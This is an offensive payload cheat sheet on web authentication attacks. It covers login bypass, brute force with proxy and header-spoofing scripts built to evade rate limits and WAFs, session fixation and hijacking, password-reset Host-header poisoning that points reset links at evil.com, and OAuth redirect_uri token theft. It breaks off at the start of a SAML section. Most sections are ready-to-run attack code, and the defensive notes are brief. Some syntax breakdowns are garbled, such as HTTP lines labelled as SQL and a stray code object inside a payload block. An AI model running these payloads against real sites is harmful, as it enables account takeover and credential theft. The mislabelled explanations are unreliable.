# Authentication Vulnerabilities

_10 web payloads_

### Authentication Bypass  `auth-bypass`
_Web application authentication bypass techniques_
Subcategory: **Authentication Bypass** · tags: `auth` `bypass` `authentication`

**Prerequisites:**
- The target has an authentication mechanism
- The authentication implementation has a flaw

**Attack Chain:**

**SQL injection bypass**
> SQL injection to bypass login
```
admin'--
admin' OR '1'='1
```
**Syntax breakdown:**
- `OR '1'='1'` — logically always true _keyword_
- `--` — SQL comment _operator_

**Array bypass**
> PHP array bypass
```
user[]=admin&pass[]=admin
```
**Syntax breakdown:**
- `user=admin&pass=admin` — command/keyword _command_

**Type juggling**
> Type juggling bypass
```
# PHP type juggling bypass - array and type confusion:
# 1. Array bypass of password comparison (strcmp bypass):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) returns NULL in PHP, NULL == 0 is true

# 2. Loose comparison bypass:
POST /login HTTP/1.1
Content-Type: application/json,

        syntaxBreakdown: [
          { part: ''', explanation: { zh: 'Close quote', en: 'Close quote' }, type: 'char' },
          { part: 'OR', explanation: { zh: 'Logical OR', en: 'Logical OR' }, type: 'keyword' },
          { part: '--', explanation: { zh: 'SQL comment', en: 'SQL comment' }, type: 'operator' }
        ]
{"user":"admin","pass":true}
# true == "any_string" is true in PHP loose comparison

# 3. Numeric string bypass:
{"user":"admin","pass":0}
# 0 == "password_string" is true in PHP (PHP < 8.0)
```

**JSON bypass**
> NoSQL bypass
```
{"user":"admin","pass":{"$ne":""}}
```
**Syntax breakdown:**
- `$ne` — MongoDB not-equal operator _operator_

**IP spoofing**
> IP spoofing bypass
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
```
**Syntax breakdown:**
- `X-Forwarded-For` — spoofs the source IP _header_

**HTTP method**
> HTTP method bypass
```
# HTTP method tampering to bypass authentication:
# 1. Try different HTTP methods:
curl -X POST "http://target.com/admin" -v
curl -X PUT "http://target.com/admin" -v
curl -X PATCH "http://target.com/admin" -v
curl -X DELETE "http://target.com/admin" -v
curl -X OPTIONS "http://target.com/admin" -v

# 2. Method override headers:
curl -X POST -H "X-HTTP-Method-Override: PUT" "http://target.com/admin"
curl -X POST -H "X-Method-Override: DELETE" "http://target.com/admin"

# 3. URL path traversal bypass:
curl "http://target.com/admin/..;/admin"
curl "http://target.com/;/admin"
curl "http://target.com/%2e%2e/admin"
```
**Syntax breakdown:**
- `PUT` — use a non-GET/POST method _method_

**WAF/EDR Bypass Variants:**

**HTTP method tampering and path normalization**
> Use non-standard HTTP methods or method override headers to bypass method-based access control, and use URL path case, double slashes, dots, encoding, and other normalization differences to bypass path matching
```
# HTTP method tampering:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE

# Path normalization:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200
```
**Syntax breakdown:**
- `# HTTP method tampering:
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PATCH /admin HTTP/1.1
OPTIONS /admin HTTP/1.1
X-HTTP-Method: PUT
X-HTTP-Method-Override: ` — SQL expression _value_
- `DELETE` — SQL keyword _keyword_
- `

# Path normalization:
/admin → 403
/ADMIN → 200
/admin/ → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%61dmin → 200` — SQL expression _value_

**HTTP/2 pseudo-headers and request splitting**
> Use HTTP/2 pseudo-headers (:path, etc.) or the X-Original-URL/X-Rewrite-URL headers to override the request path to bypass reverse proxy ACLs, and use IP spoofing headers to bypass source-based authentication
```
# HTTP/2 pseudo-header bypass:
:method: GET
:path: /admin
:authority: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Header injection:
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
```
**Syntax breakdown:**
- `# HTTP/2 pseudo-header bypass:` — primary command _command_
- `...` — 13 lines total _value_

**Overview:** Authentication bypass vulnerabilities cover a variety of attack techniques that skip identity verification mechanisms, including default credential exploitation, authentication logic flaws, session fixation, response tampering, forced browsing, and so on, directly obtaining unauthorized system access. It is one of the most common high-risk vulnerability types in web applications.

**Vulnerability Principle:** Flaws in authentication mechanism implementation include: hardcoded default credentials not enforced to be changed, authentication state relying only on client-side parameters for the determination, logic vulnerabilities in the password reset flow, predictable session token generation algorithms, skippable steps in a multi-step authentication flow, improper OAuth/SAML implementations leading to identity forgery, and so on.

**Exploitation Method:** First enumerate the target application's authentication endpoints and flow, test default credentials (admin/admin, etc.), analyze the status codes and parameters in authentication request responses, try modifying the authentication flag in the response (such as changing false to true), test directly accessing post-authentication pages (forced browsing), check whether JWT token signature verification is strict, and test concurrent logins and race conditions.

**Defensive Measures:** Implement a multi-factor authentication (MFA) mechanism; disable all default credentials and enforce a password change on first login; the authentication state determination must be done on the server side; use a cryptographically secure random number to generate session tokens; enforce server-side access control validation on all post-authentication resources; implement account lockout and abnormal login alerting mechanisms.

---

### Brute Force  `auth-brute`
_Automated password guessing attack_
Subcategory: **Brute Force** · tags: `auth` `brute-force` `password`

**Prerequisites:**
- No CAPTCHA
- No lockout policy

**Attack Chain:**

**Pitchfork**
> Brute-force multiple fields simultaneously
```
Burp Intruder: Pitchfork mode
```
**Syntax breakdown:**
- `Pitchfork` — one-to-one mapping brute force _tool-mode_

**Cluster bomb**
> Cartesian product brute force
```
Burp Intruder: Cluster bomb mode
```
**Syntax breakdown:**
- `Cluster bomb` — full permutation brute force _tool-mode_

**Response-difference-based username enumeration**
> Distinguish valid and invalid usernames via differences in response status code/length/time
_platform: linux_
```
# Enumerate valid usernames via response length/time differences
# Compare responses for valid vs. invalid usernames:
curl -s -o /dev/null -w "user=admin: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=admin&password=wrong" "http://target.com/login"

curl -s -o /dev/null -w "user=xxxxx: code=%{http_code} size=%{size_download} time=%{time_total}s"   -d "username=nonexistent_user_xxxxx&password=wrong" "http://target.com/login"

# Bulk enumeration (note the response differences):
for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do
  resp=$(curl -s -o /tmp/resp.txt -w "%{http_code}:%{size_download}:%{time_total}"     -d "username=${user}&password=test" "http://target.com/login")
  echo "${user}: ${resp}"
  sleep 1
done
```
**Syntax breakdown:**
- `-w "%{http_code}:%{size_download}:%{time_total}"` — output the response code, response body size, and response time for comparative analysis _parameter_
- `-o /dev/null` — discard the response body, keep only the statistics _parameter_
- `sleep 1` — interval between requests to avoid triggering the rate limit _command_

**CAPTCHA/OTP brute force and bypass**
> Brute force of OTP verification codes and various logic bypass techniques
```
# Scenario 1: 4-6 digit numeric verification code brute force
# Detect whether the verification code has a rate limit:
for i in $(seq 1 10); do
  code=$(printf "%06d" $RANDOM | cut -c1-6)
  resp=$(curl -s -o /dev/null -w "%{http_code}"     -d "otp=${code}" "http://target.com/verify-otp")
  echo "Attempt ${i}: otp=${code} → HTTP ${resp}"
done

# Scenario 2: bypass the frontend CAPTCHA check by modifying the response
# Capture and modify the response {"success":false} → {"success":true}

# Scenario 3: CAPTCHA reuse (the same CAPTCHA is valid multiple times)
# After obtaining the CAPTCHA, use the same CAPTCHA to try different accounts

# Scenario 4: CAPTCHA leaked in the response
curl -v -d "phone=13800138000&action=send_code" "http://target.com/api/sms"
# Check whether the response header/body contains the verification code
```
**Syntax breakdown:**
- `printf "%06d" $RANDOM` — generate a 6-digit random number as the verification code guess _command_
- `Rate limit detection` — if all 10 requests return 200, there may be no rate limit _value_
- `Response modification` — bypass by intercepting and modifying the server response with Burp _value_

**Distributed brute force and IP rotation**
> Use a proxy pool to rotate IPs to avoid being banned, and perform distributed brute force
```
# Use a proxy pool for distributed brute force:
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://target.com/login"
proxies_list = open("proxies.txt").read().splitlines()
usernames = ["admin", "administrator", "root", "test"]
passwords = open("/usr/share/wordlists/rockyou-top1000.txt").read().splitlines()

proxy_cycle = itertools.cycle(proxies_list)

def try_login(combo):
    user, pwd = combo
    proxy = next(proxy_cycle)
    try:
        r = requests.post(TARGET,
            data={"username": user, "password": pwd},
            proxies={"http": proxy, "https": proxy},
            timeout=10,
            headers={"User-Agent": f"Mozilla/5.0 (rv:{hash(proxy)%90+10}.0)"}
        )
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"[+] FOUND: {user}:{pwd} via {proxy}")
            return (user, pwd)
    except: pass
    return None

combos = [(u,p) for u in usernames for p in passwords]
with ThreadPoolExecutor(max_workers=5) as pool:
    results = list(pool.map(try_login, combos))
    found = [r for r in results if r]
    for f in found: print(f"[+] Valid: {f[0]}:{f[1]}")
```
**Syntax breakdown:**
- `itertools.cycle(proxies_list)` — cyclically use the proxies in the proxy pool _command_
- `ThreadPoolExecutor` — multi-threading concurrency to increase brute force speed _command_
- `User-Agent rotation` — each proxy uses a different UA fingerprint _value_

**WAF/EDR Bypass Variants:**

**Rate limit bypass (HTTP header spoofing)**
> Bypass IP-based rate limits by spoofing HTTP headers such as X-Forwarded-For
```
# Bypass IP-based rate limits by spoofing IP headers:
import requests
import random

TARGET = "http://target.com/login"
headers_rotation = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-Addr", "X-Client-IP", "X-Remote-IP",
    "CF-Connecting-IP", "True-Client-IP", "Forwarded"
]

def brute_with_header_bypass(username, password):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    for header in headers_rotation:
        h[header] = fake_ip
    r = requests.post(TARGET, data={"username": username, "password": password}, headers=h, timeout=10)
    return r

# Use a different spoofed IP for each request
passwords = ["admin", "123456", "password", "admin123", "root"]
for pwd in passwords:
    r = brute_with_header_bypass("admin", pwd)
    print(f"admin:{pwd} → {r.status_code} ({len(r.text)})")
```
**Syntax breakdown:**
- `X-Forwarded-For` — a proxy header that tells the backend the real client IP, can be spoofed _parameter_
- `random IP` — generate a random IP each time to bypass the IP-based counter _value_

**Parameter pollution and case bypass**
> Bypass WAF detection of brute force via parameter pollution, format switching, and encoding obfuscation
```
# Parameter pollution bypass:
# Normal request (rate limited):
curl -d "username=admin&password=test" "http://target.com/login"

# Duplicate parameter (some backends take the last value):
curl -d "username=admin&username=admin&password=test" "http://target.com/login"

# JSON format switching (if supported):
curl -H "Content-Type: application/json"   -d '{"username":"admin","password":"test"}' "http://target.com/login"

# Case obfuscation:
curl -d "Username=admin&Password=test" "http://target.com/login"
curl -d "USERNAME=admin&PASSWORD=test" "http://target.com/login"

# Unicode obfuscation:
curl -d "username=admin&password=test" "http://target.com/login"

# Extra parameter injection:
curl -d "username=admin&password=test&captcha=&token=" "http://target.com/login"

# Different encoding:
curl -d "username=admin&password=test" "http://target.com/login" -H "Content-Type: application/x-www-form-urlencoded; charset=IBM037"
```
**Syntax breakdown:**
- `# Parameter pollution bypass:` — primary command _command_
- `...` — 17 lines total _value_

**Overview:** Brute force is the most basic attack method, obtaining account privileges by trying a large number of password combinations.

**Vulnerability Principle:** A lack of anti-brute-force mechanisms (CAPTCHA, lockout, delay).

**Exploitation Method:** Use Hydra or Burp for automated attempts.

**Defensive Measures:** Implement an account lockout policy and add a CAPTCHA.

---

### Session Hijacking  `auth-session`
_Use session management flaws to hijack or forge a user session and obtain unauthorized access_
Subcategory: **Session Management** · tags: `auth` `session` `hijack`

**Prerequisites:**
- The target uses Cookie- or Token-based session management
- The session identifier can be intercepted or predicted
- Network communication is not fully encrypted (HTTP) or XSS exists

**Attack Chain:**

**Session cookie attribute analysis**
> Analyze the security attribute configuration of the target's session cookie
_platform: linux_
```
# Detect cookie security attributes
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie"

# Check key attributes:
# - HttpOnly: prevents JS from reading the cookie
# - Secure: transmitted only over HTTPS
# - SameSite: prevents CSRF
# - Path/Domain: cookie scope
# - Expires/Max-Age: session lifetime

# Bulk analyze cookies:
curl -c - "http://target.com/login" -d "user=test&pass=test" 2>/dev/null | tail -5
```
**Syntax breakdown:**
- `curl -v` — verbose mode shows the complete HTTP headers _command_
- `Set-Cookie` — the response header where the server sets the cookie _value_
- `HttpOnly` — prevents JavaScript from reading via document.cookie _value_
- `curl -c -` — output the cookie to stdout _command_

**Session Fixation attack**
> Preset a sessionId so that after the victim logs in, the attacker can reuse that session
_platform: linux_
```
# 1. The attacker obtains a valid sessionId
curl -c cookies.txt "http://target.com/"
cat cookies.txt | grep -i "session|jsession|phpsess"

# 2. Construct a link containing the fixed sessionId to induce the victim to log in
# http://target.com/login;jsessionid=ATTACKER_SESSION_ID
# Or via Set-Cookie injection:
# http://target.com/page?lang=en%0d%0aSet-Cookie:%20PHPSESSID=FIXED_SESSION

# 3. After the victim logs in with that sessionId, the attacker directly uses the same sessionId
curl -b "PHPSESSID=FIXED_SESSION" "http://target.com/dashboard"
```
**Syntax breakdown:**
- `jsessionid=` — the session identifier of a Java application _value_
- `%0d%0a` — CRLF injection used to inject a Set-Cookie header _value_
- `curl -b` — send a request with the specified cookie _command_

**Session hijacking (HTTP sniffing)**
> Intercept the session cookie in unencrypted HTTP communication
_platform: linux_
```
# Sniff HTTP cookies on the same network (requires a man-in-the-middle position)
# Use a Wireshark filter:
http.cookie contains "session" or http.cookie contains "PHPSESSID"

# Or use tcpdump:
tcpdump -i eth0 -A -s 0 'port 80 and (tcp[((tcp[12:1]&0xf0)>>2):4] = 0x436F6F6B)'

# Directly use the cookie after obtaining it:
curl -b "PHPSESSID=STOLEN_SESSION_ID" "http://target.com/admin/dashboard"
```
**Syntax breakdown:**
- `http.cookie contains` — Wireshark display filter to match the cookie field _command_
- `tcpdump -A` — display packet content in ASCII format _command_
- `0x436F6F6B` — the hexadecimal representation of "Cook", matches the Cookie header _value_

**Session prediction (weak randomness)**
> Collect multiple sessionIds to analyze their generation pattern and predict a valid session identifier
_platform: linux_
```
# Bulk collect sessionIds to analyze the pattern
for i in $(seq 1 20); do
  sid=$(curl -sI "http://target.com/" | grep -i "set-cookie" | grep -oP "(?<=PHPSESSID=)[^;]+")
  echo "$i: $sid"
  sleep 0.5
done

# Use Burp Suite Sequencer to analyze randomness
# Or analyze with Python:
# python3 -c "
# import hashlib, time
# # If the sessionId is based on a timestamp:
# for t in range(int(time.time())-100, int(time.time())+100):
#     predicted = hashlib.md5(str(t).encode()).hexdigest()
#     print(predicted)
# "
```
**Syntax breakdown:**
- `grep -oP "(?<=PHPSESSID=)[^;]+"` — use regex to extract the value of PHPSESSID _command_
- `Sequencer` — Burp Suite's session randomness analysis tool _value_

**WAF/EDR Bypass Variants:**

**Cookie Jar Overflow and Cookie Tossing**
> Set a large number of cookies exceeding the browser's storage limit to squeeze out the legitimate session cookie, or use subdomain permissions to inject a malicious cookie into the parent domain for session overwriting
```
# Cookie Jar Overflow:
# Set a large number of cookies (exceeding the browser limit of ~50) to squeeze out old cookies:
for(let i=0;i<700;i++){document.cookie=`c${i}=x;domain=.target.com`}
# After the original session cookie is squeezed out, the attacker's session can be injected

# Cookie Tossing (subdomain injection):
# Set a cookie from subdomain.target.com:
document.cookie="session=ATTACKER_SID;domain=.target.com;path=/"
# This cookie is also effective on the main domain target.com
```
**Syntax breakdown:**
- `document.cookie` — obtain the cookie _variable_

**SameSite bypass and cross-site session leakage**
> Use the feature that SameSite=Lax allows top-level navigation GET requests to carry cookies to initiate cross-site requests with credentials via link clicks or window.open
```
# SameSite=Lax bypass (top-level navigation GET requests carry cookies):
<a href="http://target.com/api/transfer?to=attacker&amount=1000">click</a>
# In Lax mode, GET requests carry cookies

# SameSite=None exploitation (requires Secure):
# If SameSite=None is set but the Secure attribute is missing:
# Chrome will reject it, but older browsers may accept it

# Bypass via window.open:
window.open("http://target.com/api/userinfo")
# The new window is top-level navigation, in Lax mode it carries cookies
```
**Syntax breakdown:**
- `# SameSite=Lax bypass (top-level navigation GET requests carry cookies):` — primary command _command_
- `...` — 9 lines total _value_

**Overview:** Session hijacking attacks exploit flaws in web application session management to obtain the session of an authenticated user. Common attack methods include: session fixation (presetting a sessionId), session sniffing (HTTP plaintext transmission), session prediction (weak random numbers), and stealing cookies via XSS.

**Vulnerability Principle:** Common session management flaws: 1) the cookie lacks the HttpOnly/Secure/SameSite attributes 2) the sessionId is not regenerated after login (leading to session fixation) 3) the sessionId has insufficient entropy and can be predicted 4) the session cookie is transmitted in HTTP plaintext 5) the session has no timeout or too long a timeout.

**Exploitation Method:** 1) analyze the cookie security attributes 2) detect session fixation (whether the sessionId changes before and after login) 3) analyze the sessionId randomness 4) attempt network sniffing (HTTP scenarios) 5) combine with XSS to steal the cookie.

**Defensive Measures:** 1) set the cookie with HttpOnly+Secure+SameSite=Strict 2) the sessionId must be regenerated after login 3) use a strong random number generator 4) site-wide HTTPS 5) set a reasonable session timeout 6) bind the session to the client fingerprint (IP/UA).

---

### Password Reset Vulnerability  `auth-password-reset`
_Bypass the password reset flow_
Subcategory: **Logic Vulnerability** · tags: `auth` `password-reset` `logic`

**Prerequisites:**
- The password reset feature has a logic flaw

**Attack Chain:**

**Host header poisoning**
> The reset link points to the attacker's domain
```
# Host header poisoning to hijack the password reset link:
# 1. Basic Host header poisoning:
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# The reset link will become: http://evil.com/reset?token=xxx

# 2. X-Forwarded-Host poisoning:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com

# 3. Double Host header:
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com

email=victim@target.com

# 4. Verify via Burp Collaborator:
Host: BURP-COLLABORATOR-ID.burpcollaborator.net
```
**Syntax breakdown:**
- `Host` — HTTP Host header _header_

**Token brute force**
> Verification code too short
```
# Password reset verification code brute force:
# 1. Send a reset verification code request:
curl -d "email=victim@target.com" "http://target.com/forgot-password"

# 2. Four-digit numeric verification code brute force (0000-9999):
# Burp Intruder settings:
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&code=§0000§
# Payload: Numbers, From 0, To 9999, Min/Max 4 digits

# 3. Six-digit verification code brute force (requires more time):
import requests
for code in range(0, 999999):
    r = requests.post('http://target.com/reset-password',
        data={'email':'victim@target.com','code':f'{code:06d}'})
    if 'success' in r.text or r.status_code == 302:
        print(f'Valid code: {code:06d}')
        break
```
**Syntax breakdown:**
- `Token` — reset verification code _parameter_

**Password reset Token predictability analysis**
> Analyze the generation pattern of the password reset token to determine whether it is predictable
```
# Bulk request password reset tokens to analyze the pattern:
import requests
import time
import hashlib

tokens = []
for i in range(10):
    r = requests.post("http://target.com/api/password-reset",
        data={"email": f"test{i}@example.com"})
    # Obtain the token from the email API or response
    if "token" in r.text:
        import json
        token = json.loads(r.text).get("token", "")
        tokens.append({"time": time.time(), "token": token})
        print(f"Token {i}: {token}")
    time.sleep(0.5)

# Analyze the Token pattern:
for i, t in enumerate(tokens):
    print(f"Token {i}: len={len(t['token'])}, "
          f"hex={'yes' if all(c in '0123456789abcdef' for c in t['token'].lower()) else 'no'}, "
          f"time={t['time']}")

# Check whether it is based on a timestamp:
for ts in range(int(tokens[0]['time'])-5, int(tokens[0]['time'])+5):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    if candidate == tokens[0]['token']:
        print(f"[+] Token is MD5(timestamp)! Predictable!")
```
**Syntax breakdown:**
- `hashlib.md5(str(ts).encode())` — test whether the token is the MD5 hash of a timestamp _command_
- `Bulk request` — collect multiple token samples for pattern analysis _value_

**Password reset flow logic flaws**
> Test various logic vulnerabilities in the password reset flow
```
# 1. Parameter tampering - modify the email/phone number:
# Replace the recipient email when sending the reset request
curl -d "email=victim@target.com&notify_email=attacker@evil.com"   "http://target.com/api/password-reset"

# 2. IDOR - directly use another user's reset Token/UID:
curl -d "token=VALID_TOKEN&uid=OTHER_USER_ID&new_password=hacked123"   "http://target.com/api/password-reset/confirm"

# 3. Step skipping - directly access the set-new-password page:
curl -d "uid=123&new_password=test12345"   "http://target.com/api/password-reset/set-password"

# 4. Token not invalidated - use an already-used Token:
curl -d "token=ALREADY_USED_TOKEN&new_password=newpass123"   "http://target.com/api/password-reset/confirm"

# 5. Password reset poisoning (Host header injection):
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"   -d "email=victim@target.com" "http://target.com/api/password-reset"
# The reset link the victim receives: http://evil.com/reset?token=xxx
```
**Syntax breakdown:**
- `X-Forwarded-Host: evil.com` — Host header poisoning makes the reset link point to the attacker's domain _parameter_
- `uid=OTHER_USER_ID` — IDOR attack, tamper with the user ID to reset another user's password _value_

**WAF/EDR Bypass Variants:**

**Multiple Host header poisoning variant bypasses**
> Multiple WAF bypass variants of Host header poisoning
```
# Standard Host header poisoning:
curl -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# X-Forwarded-Host (often trusted by web frameworks):
curl -H "X-Forwarded-Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Multiple Host headers:
curl -H "Host: target.com" -H "Host: evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Inject a port in Host:
curl -H "Host: target.com@evil.com" -d "email=victim@target.com" "http://target.com/forgot"
curl -H "Host: target.com:evil.com" -d "email=victim@target.com" "http://target.com/forgot"

# Absolute URL to override Host:
curl "http://target.com/forgot" -H "Host: evil.com" --request-target "http://target.com/forgot"

# X-Original-URL / X-Rewrite-URL:
curl -H "X-Original-URL: /forgot" -H "Host: evil.com" "http://target.com/forgot"
```
**Syntax breakdown:**
- `# Standard Host header poisoning:` — primary command _command_
- `...` — 13 lines total _value_

**Token brute force rate limit bypass**
> Bypass the rate limit on reset token brute force via IP header rotation and UA randomization
```
# IP rotation to bypass the rate limit:
import requests
import random

def try_token(token, proxy=None):
    headers = {
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
    }
    r = requests.post("http://target.com/reset-password",
        data={"token": token, "new_password": "Test123!"},
        headers=headers, timeout=10)
    return r.status_code != 400

# If the Token is 6 digits:
for i in range(0, 1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"[+] Valid token: {token}")
        break
```
**Syntax breakdown:**
- `# IP rotation to bypass the rate limit:` — primary command _command_
- `...` — 22 lines total _value_

**Overview:** The password reset vulnerability is one of the most common logic flaws in authentication mechanisms, involving multiple attack vectors such as predictable reset tokens, token leakage, Host header injection, and parameter tampering. By exploiting design flaws in the password reset flow, an attacker can take over any user account without knowing the original password.

**Vulnerability Principle:** Common flaws in the password reset flow include: the reset token generation algorithm is predictable (such as based on a timestamp or user ID), the token has no expiration time or too long an expiration time, the token is not invalidated immediately after use (can be replayed), the link in the reset email is controlled by the Host header (Host Header Injection), the reset verification code has insufficient digits and can be brute-forced, and another user's password can be reset by modifying the user identifier parameter.

**Exploitation Method:** First analyze the complete request chain of the password reset flow, test the predictability of the reset token (collect multiple tokens to analyze the pattern), try Host header injection (change the Host to an attacker-controlled domain to make the reset link point to a malicious server), test parameter tampering (submit your own email and the target user's ID simultaneously), and check whether the verification code can be brute-forced (4-6 digits with no rate limit).

**Defensive Measures:** Use a cryptographically secure random number to generate the reset token (at least 128 bits); set a short validity period for the token (15-30 minutes) and invalidate it immediately after use; fix the domain in the reset email so it is not affected by the Host header; the verification code should be at least 6 digits and limit the number of attempts; the user identifier for the reset operation should be obtained only from the server-side session, not a client parameter; log all password reset operations and support anomaly alerting.

---

### OAuth Vulnerability  `auth-oauth`
_OAuth authentication flow vulnerability_
Subcategory: **OAuth** · tags: `auth` `oauth` `redirect`

**Prerequisites:**
- Uses OAuth login

**Attack Chain:**

**CSRF attack**
> Lack of the state parameter
```
# OAuth CSRF - forced account linking attack:
# 1. Obtain the attacker's OAuth authorization code:
#    Go through the OAuth flow normally to the callback but do not complete it
#    Intercept: http://target.com/callback?code=ATTACKER_CODE

# 2. Construct a CSRF page:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- Or use an iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. After the victim visits the page, their account will be linked to the attacker's OAuth account
# 4. The attacker can log into the victim's account via OAuth

# Defensive detection: check whether the authorization request carries the state parameter
```
**Syntax breakdown:**
- `state` — anti-CSRF parameter _parameter_

**Redirect URI**
> Redirect to the attacker to obtain the Code
```
redirect_uri=http://attacker.com
```
**Syntax breakdown:**
- `redirect_uri` — callback address _parameter_

**OAuth State parameter missing/predictable CSRF**
> Detect the absence or predictability of the state parameter in the OAuth flow
```
# 1. Detect whether the state parameter exists:
# Access the OAuth authorization URL and check whether there is a state parameter
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. If there is no state parameter → CSRF linking attack:
# The attacker initiates authorization with their own OAuth account and obtains the code
# Construct the link: http://target.com/callback?code=ATTACKER_CODE
# Send it to the victim → the victim's account is linked to the attacker's OAuth account

# 3. If the state is predictable:
# Request multiple times to obtain state values and analyze the pattern
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done
```
**Syntax breakdown:**
- `state parameter` — the random value in OAuth to prevent CSRF; if missing it can be attacked _value_
- `code=ATTACKER_CODE` — inject the attacker's authorization code into the victim's callback _value_

**Token theft and Scope escalation**
> Test OAuth Token theft, Scope escalation, and cross-application Token reuse
```
# 1. Leak the Token via redirect_uri:
# In the implicit flow the Token is in the URL fragment:
# http://attacker.com/callback#access_token=xxx
# Leak via Referer:
# If the callback page has an external link, the Token will leak via the Referer

# 2. Scope escalation - request higher privileges:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token reuse test - use the Token obtained via authorization_code to access other APIs:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer ${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. Unlimited renewal after refresh_token theft:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx"   "http://target.com/oauth/token"
```
**Syntax breakdown:**
- `scope=admin+write+delete` — request a Scope exceeding the application's normal permissions _value_
- `refresh_token` — a long-lived refresh token, allows unlimited renewal after theft _value_

**WAF/EDR Bypass Variants:**

**Redirect URI bypass techniques collection**
> Multiple redirect_uri allowlist bypass techniques
```
# Allowlist bypass techniques:

# 1. Subdomain bypass (if the allowlist uses suffix matching):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. Path traversal:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. Parameter injection:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. Port injection:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL encoding bypass:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/internal network bypass:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. Open redirect chain:
redirect_uri=http://target.com/redirect?url=http://evil.com
```
**Syntax breakdown:**
- `# Allowlist bypass techniques:` — primary command _command_
- `...` — 20 lines total _value_

**Overview:** OAuth authentication vulnerabilities cover various security flaws in the OAuth 2.0 authorization flow, including a missing state parameter for CSRF, authorization code leakage, token hijacking, lax redirect_uri validation, Client Secret leakage, Scope escalation, and so on, which can lead to user account hijacking or unauthorized access to sensitive resources.

**Vulnerability Principle:** Common flaws in OAuth 2.0 implementations: lax redirect_uri validation (allowing sub-paths or open redirects) leading to authorization code/token leakage to an attacker-controlled endpoint, a missing state parameter leading to CSRF, an authorization code not bound to the client and thus replayable, the access_token in the implicit grant being directly exposed in the URL fragment, and the Client ID/Secret being hardcoded in frontend code or a mobile app.

**Exploitation Method:** First fully analyze the OAuth authorization flow (capture and observe the parameters of the authorize and token endpoints), test whether the redirect_uri can be modified to an attacker-controlled URL (try sub-paths, URL encoding, open redirect chains), check whether the state parameter exists and is validated, analyze the frontend JS and mobile app code to find a leaked Client Secret, and test whether the Scope parameter can be escalated to obtain more privileges.

**Defensive Measures:** Strictly validate the redirect_uri using exact matching rather than prefix matching; enforce the use of the state parameter to prevent CSRF and validate it on the server side; use PKCE (Proof Key for Code Exchange) to enhance the security of the authorization code flow; avoid using the implicit grant mode; keep the Client Secret strictly confidential and do not hardcode it on the client; implement token binding and a least-privilege Scope policy.

---

### SAML Vulnerability  `auth-saml`
_SAML assertion attack_
Subcategory: **SAML** · tags: `auth` `saml` `xml`

**Prerequisites:**
- Uses SAML SSO

**Attack Chain:**

**XML signature bypass**
> SAML Raider tool
```
# SAML assertion tampering - remove signature validation:
# 1. Intercept the SAML Response (Burp Suite):
